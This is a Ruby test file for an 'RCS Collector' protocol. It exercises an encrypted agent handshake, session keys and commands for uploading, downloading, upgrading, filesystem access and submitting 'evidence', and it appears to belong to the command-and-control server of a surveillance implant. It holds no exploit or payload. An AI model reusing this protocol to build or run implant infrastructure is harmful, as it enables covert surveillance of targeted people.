require "helper"
require 'rcs-common'
require 'singleton'
require 'base64'

module RCS
module Collector

class EvidenceManager
  def trace(a, b)
  end
  def store_evidence(sess, s, c)
    # do nothing during test
  end
end

class EvidenceTransfer
  def trace(a, b)
  end
  def queue(s, i)
    # do nothing during the test
  end
end

# dirty hack to fake the trace function
# re-open the class and override the method
class SessionManager
  def trace(a, b)
  end
end
class Protocol
  def self.trace(a, b)
  end
end

# mockup for the config singleton
class Config
  include Singleton
  def initialize
    @global = {'DB_ADDRESS' => 'test',
               'DB_PORT' => 80,
               'DB_SIGN' => 'rcs-server.sig',
               'DB_CERT' => 'rcs.pem'}
  end
end

# Mockup for the DB class
class DB
  def trace(a, b)
  end
end

# fake class used during the DB initialize
class DB_rest
  def trace(a, b)
  end
end

class TestProtocol < Test::Unit::TestCase
  include RCS::Crypt

  def setup
    DB.instance.instance_variable_set(:@agent_signature, Digest::MD5.digest('test-signature'))
    DB.instance.instance_variable_set(:@factory_keys, {"RCS_9999999999" => 'test-class-key'})
  end

  def test_invalid_auth
    # too short
    content = Protocol.authenticate('test-peer', 'test-uri', "ciao" * 16)
    assert_nil content

    # random junk
    auth_content = SecureRandom.random_bytes(112)
    content = Protocol.authenticate('test-peer', 'test-uri', auth_content)
    assert_nil content

    # fake message inside the crypt
    message = "test fake message to fuzzy the protocol".ljust(104, "\x00")
    message = aes_encrypt(message, DB.instance.agent_signature)
    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
    assert_nil content
  end

  def test_valid_auth
    # Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, SubType, Cb ) )
    kd = "\x01" * 16
    nonce = "\x02" * 16
    build = "RCS_9999999999".ljust(16, "\x00")
    instance = "\x03" * 20
    type = "TEST".ljust(16, "\x00")
    sha = Digest::SHA1.digest(build + instance + type + DB.instance.factory_key_of('RCS_9999999999'))
    message = kd + nonce + build + instance + type + sha
    message = aes_encrypt(message, DB.instance.agent_signature)

    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)

    assert_equal "application/octet-stream", type
    assert_kind_of String, cookie

    # [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]
    assert_equal 64, content.length
    ks = aes_decrypt(content.slice!(0..31), DB.instance.agent_signature)
    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_9999999999') + ks + kd)
    snonce = aes_decrypt(content, k)

    # check if the nonce is equal in the response
    assert_equal nonce, snonce.slice(0..15)

    assert_true Protocol.valid_authentication('test-peer', cookie)
  end

  def test_valid_auth_scout
    # Base64 ( Crypt_S ( Pver, Kd, sha(Kc | Kd), BuildId, InstanceId, Platform ) )
    pver = [1].pack('I')
    kd = "\x01" * 16
    build = "RCS_9999999999".ljust(16, "\x00")
    instance = "\x03" * 20
    platform = "\x00" + "\x00" + "\x00" + "\x00"
    sha = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_9999999999') + kd)
    message = pver + kd + sha + build + instance + platform
    message = aes_encrypt(message, DB.instance.agent_signature, PAD_NOPAD)
    message += SecureRandom.random_bytes(rand(128..1024))
    message = Base64.strict_encode64(message)

    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)

    assert_equal "application/octet-stream", type
    assert_kind_of String, cookie

    # Base64 ( Crypt_C ( Ks, sha(K), Response ) )
    content = Base64.strict_decode64(content)

    # normalize to 16 block
    newlen = content.length - (content.length % 16)
    content = content[0..newlen-1]

    content = aes_decrypt(content, DB.instance.factory_key_of('RCS_9999999999'), PAD_NOPAD)

    ks = content.slice!(0..15)
    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_9999999999') + ks + kd)

    check = content.slice!(0..19)
    assert_equal check, Digest::SHA1.digest(k + ks)

    assert_true Protocol.valid_authentication('test-peer', cookie)
  end

  def test_ident
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-platform", false, false, key, "127.0.0.1")

    # prepare the command
    message = [Commands::PROTO_ID].pack('I')
    message += [2011010101].pack('I')
    message += "agent.userid".pascalize + "agent.deviceid".pascalize + "agent.sourceid".pascalize
    enc = aes_encrypt_integrity(message, key)

    content, type, rcookie = Protocol.commands('test-peer', cookie, enc)

    assert_equal "application/octet-stream", type

    assert_nothing_raised do
      resp = aes_decrypt_integrity(content, key)
      command, tot, time, size, *list = resp.unpack('I2qI*')
      assert_equal Commands::PROTO_OK, command
    end
  end

  def test_bye
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-platform", false, false, key, "127.0.0.1")

    # check that the session is valid (after the bye must be invalid)
    assert_true Protocol.valid_authentication('test-peer', cookie)

    # prepare the command
    message = [Commands::PROTO_BYE].pack('I')
    enc = aes_encrypt_integrity(message, key)

    content, type, rcookie = Protocol.commands('test-peer', cookie, enc)

    assert_equal "application/octet-stream", type

    assert_nothing_raised do
      resp = aes_decrypt_integrity(content, key)
      command = resp.unpack('I').first
      assert_equal Commands::PROTO_OK, command
    end

    # after the bye, the session must be invalid
    assert_false Protocol.valid_authentication('test-peer', cookie)
  end

  def test_commands
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-platform", false, false, key, "127.0.0.1")

    # all the commands
    commands = [Commands::PROTO_CONF, Commands::PROTO_UPLOAD, Commands::PROTO_UPGRADE, Commands::PROTO_DOWNLOAD, Commands::PROTO_FILESYSTEM]

    commands.each do |cmd|
      message = [cmd].pack('I')
      enc = aes_encrypt_integrity(message, key)
      content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
      assert_equal "application/octet-stream", type
      assert_nothing_raised do
        resp = aes_decrypt_integrity(content, key)
      end
    end
  end

  def test_evidence
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-platform", false, false, key, "127.0.0.1")

    evidence = 'test-evidence'
    message = [Commands::PROTO_EVIDENCE].pack('I') + [evidence.length].pack('I') + evidence

    enc = aes_encrypt_integrity(message, key)
    content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
    assert_equal "application/octet-stream", type
    assert_nothing_raised do
      resp = aes_decrypt_integrity(content, key)
      command = resp.unpack('I').first
      assert_equal Commands::PROTO_OK, command
    end
  end

end

end #Collector::
end #RCS::
